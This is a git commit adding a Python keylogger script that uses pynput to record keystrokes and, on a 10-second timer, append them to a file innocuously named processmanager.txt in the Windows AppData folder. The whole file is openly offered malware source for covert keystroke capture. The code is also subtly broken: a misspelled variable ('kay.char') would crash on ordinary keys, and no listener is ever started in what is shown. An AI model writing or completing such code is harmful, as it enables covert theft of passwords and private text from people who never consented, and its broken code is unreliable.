498378acd7e788451ed17078b5484bf6747e1d4b
Atharva1479 <76987608+Atharva1479@users.noreply.github.com>
2022-11-25 22:45:24 +0530

    Create Keylogger.py

---
+++ Keylogger.py
@@ -0,0 +1,35 @@
+#!usr/bin/python
+import pynput.keyboard
+import threading
+import os
+
+log = ""
+path = os.environ["appdata"] + "\\processmanager.txt"
+
+def process_keys(key):
+        global log
+        try:
+               log = log + str(kay.char)
+        except AttributeError:
+              if key == key.space:
+                       log = log + " "
+              elif key == key.right:
+                       log = log + ""
+              elif key == key.left:
+                       log = log + ""
+              elif key == key.up:
+                       log = log + ""
+              elif key == key.down:
+                       log = log + ""
+              else:
+                       log = log + " " + str(key) + " "
+
+def report():
+         global log
+         global path
+         fin = open(path, "a")
+         fin.write(log)
+         log = ""
+         fin.close()
+         timer = threading.Timer(10, report)
+         timer.start()
